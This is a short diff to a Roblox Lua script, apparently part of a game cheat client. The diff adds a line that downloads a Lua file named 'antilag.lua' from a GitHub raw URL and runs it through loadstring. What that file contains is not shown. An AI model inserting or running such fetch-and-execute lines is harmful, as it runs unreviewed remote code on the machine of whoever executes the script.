@@ -6,6 +6,8 @@ while not game:IsLoaded() or not game:GetService("CoreGui") or not game:GetServi
     wait(2)
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/theplayer8000/Client-X/main/antilag.lua"))();
+
 local FsMain = {
     "1xToxsins",
     "vSebyy",
